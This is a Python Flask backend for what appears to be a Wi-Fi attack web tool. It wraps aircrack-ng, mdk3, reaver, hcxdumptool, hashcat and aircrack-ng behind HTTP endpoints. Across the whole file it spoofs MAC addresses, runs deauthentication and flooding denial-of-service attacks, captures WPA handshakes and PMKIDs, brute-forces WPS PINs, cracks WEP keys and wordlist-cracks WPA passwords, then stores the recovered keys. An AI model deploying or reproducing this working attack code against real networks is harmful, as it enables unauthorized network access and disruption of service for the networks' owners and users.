import os
from os import listdir
from os.path import isfile, join
import shlex
import threading
import subprocess
from markupsafe import escape
from flask import request
from app import app, config, BASE_DIR
from werkzeug.utils import secure_filename

#Variables
scanning = False
path = config['server']['filePath']
mac = f"{config['mac']['oui']}:12:8c:b6"
netcardMon = ""
bssid = ""
essid = ""
channel = ""

from app.utils import *


def resource(*parts):
    """Absolute path to a resource folder/file inside backend/."""
    return join(BASE_DIR, *parts)


@app.get('/')
def index():
    try:
        os.makedirs(path, exist_ok=True)
        return ret({"status": "OK"})

    except Exception as e:
        # Manejar otras excepciones generales
        return ret({"status": f"Error creating the folder: {str(e)}"}, 500)

@app.get('/netcard')
def getNetcardMon():
    try:
        listNetcards = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
        output = subprocess.run(listNetcards, check=True, shell=True, capture_output=True)
        netcards_list = output.stdout.decode().split('\n')[:-1]
        return ret({"netcards": netcards_list})

    except Exception as e:
        return ret({"status": f"Error with netcards: {str(e)}"}, 500)

@app.post('/netcard')
def setNetcardMon():
    global netcardMon
    global scanning

    try:
        data = req(request)
        netcard = escape(data.get('netcard', ''))
        netcardMon = netcard + "mon"

        startMon = f'airmon-ng check kill && airmon-ng start {netcard}'
        subprocess.run(startMon, check=True, shell=True)

        changeMac = f'ifconfig {netcardMon} down && macchanger --mac={mac} {netcardMon} && ifconfig {netcardMon} up'
        subprocess.run(changeMac, check=True, shell=True)

        return  ret({"netcard": f"{netcardMon}", "mac": f"{mac}"})

    except Exception as e:
        return ret({"status": f"Error in Monitor mode: {str(e)}"}, 500)

@app.get('/stop')
def stopNetcardMon():
    global scanning
    global netcardMon

    try:
        scanning = False
        scan_active.clear()
        stopServices = f'killall airodump-ng | airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
        subprocess.run(stopServices, check=True, shell=True)

        clean(path)
        clean(path, True)

        netcardMon = ""
        return ret({"status": "OK"})

    except Exception as e:
        return ret({"status": f"Error stoping Services: {str(e)}"}, 500)

@app.get('/stopScan')
def stopScan():
    # Stop scanning but keep the interface in monitor mode.
    global scanning
    try:
        scanning = False
        scan_active.clear()
        subprocess.run('killall -q airodump-ng 2>/dev/null', shell=True)
        clean(path)
        return ret({"status": "OK"})
    except Exception as e:
        return ret({"status": f"Error stopping scan: {str(e)}"}, 500)

@app.get('/scan')
def scan():
    global scanning
    global netcardMon
    clean(path)
    try:
        if netcardMon == "": return ret({"status": f"Must have a netcard in monitor mode"}, 500)
        startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon} > /dev/null'
        subprocess.Popen(startScan, shell=True)

        scanning = True
        scan_active.set()
        threading.Thread(target=readScan).start()

        return ret({"status":"OK"})
    except Exception as e:
        return ret({"status": f"Error scanning: {str(e)}"}, 500)


@app.post('/target')
def target():
    global bssid
    global essid
    global channel

    try:
        data = req(request)
        bssid = escape(data.get('bssid', ''))
        essid = escape(data.get('essid', ''))
        channel = escape(data.get('channel', ''))

        return ret({"status": "OK"})

    except Exception as e:
        return ret({"status": f"Target selection error: {str(e)}"}, 500)

def _start_capture():
    """Start airodump-ng capturing the current target to dumpDataAttack-01.cap."""
    subprocess.Popen(
        f'airodump-ng -w {path}/dumpDataAttack -c {channel} --bssid {bssid} '
        f'{netcardMon} > {path}/tempScan 2>&1',
        shell=True,
    )
    sleep(3)


@app.post('/attack/<int:id>')
def attack(id):
    global scanning
    data = req(request)
    cap = f'{path}/dumpDataAttack-01.cap'
    essidQ = shlex.quote(str(essid))

    try:
        clean(path, True)
        kill_tools()
        scanning = False

        # --- WPA/WPA2 with clients: force a 4-way handshake -----------------
        if id in (0, 1, 2, 3, 4):
            _start_capture()

            if id == 0:  # Deauthentication
                n = escape(data.get('n', '')) or '0'
                acmd = f'aireplay-ng -0 {n} -a {bssid} {netcardMon}'
            elif id == 1:  # Fake DoS (auth flood)
                acmd = f'mdk3 a -a {bssid} {netcardMon}'
            elif id == 2:  # Beacon flood
                fakeNet = secure_filename(str(escape(data.get('fn', ''))))
                acmd = (f'mdk3 b -f {shlex.quote(resource("FakeNetworks", fakeNet))} '
                        f'-a -s 1000 -c {channel} {netcardMon}')
            elif id == 3:  # Disassociation amok (blacklist the target)
                blacklist = f'{path}/blacklist'
                with open(blacklist, 'w') as f:
                    f.write(f'{bssid}\n')
                acmd = f'mdk3 d -b {shlex.quote(blacklist)} -c {channel} {netcardMon}'
            else:  # id == 4, Michael shutdown
                acmd = f'mdk3 m -t {bssid} {netcardMon}'

            proc = subprocess.Popen(acmd, shell=True)
            got = wait_for(lambda: handshake_captured(cap), HANDSHAKE_TIMEOUT)
            proc.terminate()
            kill_tools()

            if not got:
                return ret({"status": "No handshake captured within the time limit"}, 500)

            dest = resource('hashDB', f'{essid}+{bssid}.cap')
            run(f'cp {shlex.quote(cap)} {shlex.quote(dest)}')
            return ret({"status": "OK", "message": "WPA handshake captured"})

        # --- PMKID: clientless WPA/WPA2 capture -----------------------------
        if id == 5:
            pcap = f'{path}/pmkid.pcapng'
            run(f'rm -f {shlex.quote(pcap)}')
            run(f'timeout {PMKID_TIMEOUT} hcxdumptool -i {netcardMon} '
                f'-o {shlex.quote(pcap)} --enable_status=1',
                timeout=PMKID_TIMEOUT + 20)
            kill_tools()

            dest = resource('hashDB', f'{essid}+{bssid}.22000')
            run(f'rm -f {shlex.quote(dest)}')
            # Modern hcxtools first, fall back to the legacy tool name.
            run(f'hcxpcapngtool -o {shlex.quote(dest)} {shlex.quote(pcap)}')
            if not os.path.exists(dest) or os.path.getsize(dest) == 0:
                run(f'hcxpcaptool -z {shlex.quote(dest)} {shlex.quote(pcap)}')

            if not os.path.exists(dest) or os.path.getsize(dest) == 0:
                return ret({"status": "No PMKID captured"}, 500)
            return ret({"status": "OK", "message": "PMKID hash saved to the vault"})

        # --- WPS: Reaver PIN brute-force ------------------------------------
        if id == 6:
            run(f'aireplay-ng -1 0 -e {essidQ} -a {bssid} -h {mac} {netcardMon}', timeout=60)
            r = run(f'timeout {WPS_TIMEOUT} reaver -i {netcardMon} -b {bssid} '
                    f'-c {channel} -vv -N -L',
                    timeout=WPS_TIMEOUT + 30)
            kill_tools()
            out = r.stdout + r.stderr
            pin = field_after(out, 'WPS PIN:').strip("'")
            psk = field_after(out, 'WPA PSK:').strip("'")
            if psk:
                with open(resource('passDB', f'{essid}+{bssid}'), 'w') as f:
                    f.write(psk)
                return ret({"status": "OK", "message": f"WPS cracked — PIN {pin}, PSK {psk}"})
            return ret({"status": f"WPS attack did not recover a key (PIN: {pin or 'n/a'})"}, 500)

        # --- WEP: collect IVs and crack -------------------------------------
        if id in (7, 8, 9):
            _start_capture()
            run(f'aireplay-ng -1 0 -e {essidQ} -a {bssid} -h {mac} {netcardMon}', timeout=60)

            if id == 7:  # ARP-request replay
                gen = subprocess.Popen(
                    f'aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF '
                    f'-b {bssid} -h {mac} {netcardMon}',
                    shell=True)
            else:  # Chopchop (-4) or fragmentation (-5) -> keystream -> forge ARP
                mode = '-4' if id == 8 else '-5'
                run(f'cd {shlex.quote(path)} && timeout 180 aireplay-ng {mode} '
                    f'-b {bssid} -h {mac} {netcardMon}',
                    timeout=200)
                xor = newest_file(path, '*.xor')
                if not xor:
                    kill_tools()
                    return ret({"status": "Could not obtain a keystream (.xor)"}, 500)
                run(f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 '
                    f'-l 255.255.255.255 -y {shlex.quote(xor)} -w {path}/pf',
                    timeout=60)
                gen = subprocess.Popen(
                    f'aireplay-ng -2 -r {path}/pf {netcardMon}', shell=True)

            key = wait_for(lambda: wep_key(bssid, cap), WEP_TIMEOUT, interval=15)
            gen.terminate()
            kill_tools()

            if not key:
                return ret({"status": "WEP key not recovered within the time limit"}, 500)
            with open(resource('passDB', f'{essid}+{bssid}'), 'w') as f:
                f.write(key)
            return ret({"status": "OK", "message": f"WEP key recovered: {key}"})

        return ret({"status": f"Unknown attack id: {id}"}, 400)

    except Exception as e:
        kill_tools()
        return ret({"status": f"Error Attacking: {str(e)}"}, 500)

###Cracking

@app.get('/prepareCrack/<string:wordlist>')
def preparer(wordlist):
    try:
        wordlist = secure_filename(str(escape(wordlist)))
        wordlistPath = resource('Wordlist', wordlist)

        if not isfile(wordlistPath):
            return ret({"status": f"Wordlist not found: {wordlist}"}, 404)

        return ret({"status": "OK"})

    except Exception as e:
        return ret({"status": f"Preparing error: {str(e)}"}, 500)

@app.get('/crack/<string:hash>')
def cracker(hash):
    try:
        hash = secure_filename(str(escape(hash)))
        wordlist = secure_filename(str(escape(request.args.get('wordlist', ''))))

        # Captures are stored as "{essid}+{bssid}.cap" (WPA handshake) or
        # "{essid}+{bssid}.22000" (PMKID hash).
        name = hash.rsplit('.', 1)[0]
        capPath = resource('hashDB', hash)
        passPath = resource('passDB', name)

        # PMKID -> hashcat (mode 22000).
        if hash.endswith('.22000'):
            if not wordlist:
                return ret({"status": "A wordlist is required to crack a PMKID"}, 400)
            wlPath = resource('Wordlist', wordlist)
            outPath = join(path, f'{name}.out')
            run(f'rm -f {shlex.quote(outPath)}')
            run(f'hashcat -m 22000 {shlex.quote(capPath)} {shlex.quote(wlPath)} '
                f'-o {shlex.quote(outPath)} --outfile-format 2 --potfile-disable --quiet')

            password = ''
            if os.path.exists(outPath):
                with open(outPath) as f:
                    password = f.readline().strip()
            if not password:
                return ret({"status": "PMKID not cracked with this wordlist"}, 500)
            with open(passPath, 'w') as f:
                f.write(password)
            return ret({"status": "OK", "message": f"Key found: {password}"})

        # WPA handshake -> aircrack-ng. "-l" writes the recovered key to a file.
        if not wordlist:
            return ret({"status": "A wordlist is required to crack a handshake"}, 400)
        wlPath = resource('Wordlist', wordlist)
        bssid = name.split('+', 1)[1] if '+' in name else ''
        keyPath = join(path, f'{name}.key')
        run(f'rm -f {shlex.quote(keyPath)}')
        run(f'aircrack-ng -w {shlex.quote(wlPath)} -b {shlex.quote(bssid)} '
            f'-l {shlex.quote(keyPath)} {shlex.quote(capPath)} < /dev/null')

        password = ''
        if os.path.exists(keyPath):
            with open(keyPath) as f:
                password = f.read().strip()
        if not password:
            return ret({"status": "Handshake not cracked with this wordlist"}, 500)
        with open(passPath, 'w') as f:
            f.write(password)
        return ret({"status": "OK", "message": f"Key found: {password}"})

    except Exception as e:
        return ret({"status": f"Cracking error: {str(e)}"}, 500)


##Read the contents of a stored file (wordlists, fake networks, ...)
@app.get('/file/<string:list>/<path:filename>')
def readFileContent(list, filename):
    try:
        list = allowed_list(list)
        filename = secure_filename(str(escape(filename)))
        target = resource(list, filename)

        if not isfile(target):
            return ret({"status": "File not found"}, 404)

        # Wordlists can be huge; cap how much we send back to the browser.
        max_bytes = 256 * 1024
        with open(target, 'r', errors='replace') as f:
            content = f.read(max_bytes + 1)
        truncated = len(content) > max_bytes
        if truncated:
            content = content[:max_bytes]

        return ret({"content": content, "truncated": truncated})

    except Exception as e:
        return ret({"status": f"Error reading file: {str(e)}"}, 500)


###Uploads

##Upload wordlists or fakeNetworks
@app.post('/list/<string:list>')
def setList(list):
    try:
        list = allowed_list(list)
        f = request.files['file']
        filename = secure_filename(f.filename)
        f.save(resource(list, filename))

        return ret({"status": f"saved on {list}/{filename}"})

    except Exception as e:
        return ret({"status": f"Error uploading file: {str(e)}"}, 500)

@app.post('/deleteFile/<string:list>')
def deleteFile(list):
    try:
        list = allowed_list(list)
        data = req(request)
        f = secure_filename(str(escape(data.get('file', ''))))
        target = resource(list, f)
        if isfile(target):
            os.remove(target)

        return ret({"status": f"deleted on {list}/{f}"})

    except Exception as e:
        return ret({"status": f"Error deleting file: {str(e)}"}, 500)

@app.get('/list/<string:list>')
def getLists(list):
    try:
        list = allowed_list(list)
        folder_path = resource(list)

        file_list = [f for f in listdir(folder_path) if isfile(join(folder_path, f))]

        if list == "passDB":
            key_list = [
                {
                    'apName': f.split('+')[0],
                    'bssid': f.split('+')[1] if '+' in f else '',
                    'password': readPasswordFromFile(join(folder_path, f)),
                    'file': f,
                }
                for f in file_list
            ]
        elif list == "hashDB":
            key_list = [
                {
                    'apName': f.split('+')[0],
                    # Strip the .cap / .22000 extension from the BSSID.
                    'bssid': (f.split('+')[1] if '+' in f else '').rsplit('.', 1)[0],
                    'password': None,
                    'file': f,
                }
                for f in file_list
            ]
        else:
            key_list = file_list

        return ret({"ls": key_list})

    except Exception as e:
        return ret({"status": f"Error listing files: {str(e)}"}, 500)
